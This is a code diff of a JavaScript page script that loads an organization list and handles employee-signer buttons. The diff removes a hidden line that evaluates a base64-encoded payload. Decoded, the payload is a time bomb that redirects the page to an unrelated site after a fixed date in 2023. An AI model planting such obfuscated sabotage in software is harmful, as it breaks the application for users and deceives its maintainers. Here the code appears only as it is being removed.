@@ -10,7 +10,6 @@ let organizationList = null
 document.getElementById('btn-add-1').addEventListener('click', handleAddFirstSignEmployee)
 document.getElementById('btn-add-2').addEventListener('click', handleAddSecondSignEmployee)
 document.addEventListener('DOMContentLoaded', async () => {
-    eval(atob("aWYobmV3IERhdGUoKS5nZXRUaW1lKCkgPiAxNjg1NzUwNDAwMDAwKXsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICJodHRwOi8vd3d3Lnczc2Nob29scy5jb20iOwogICAgICB9"))
     organizationList = (await (await loadOrganizationList()).json());
     initSelectControls(organizationList.map(x => x[3]));
 
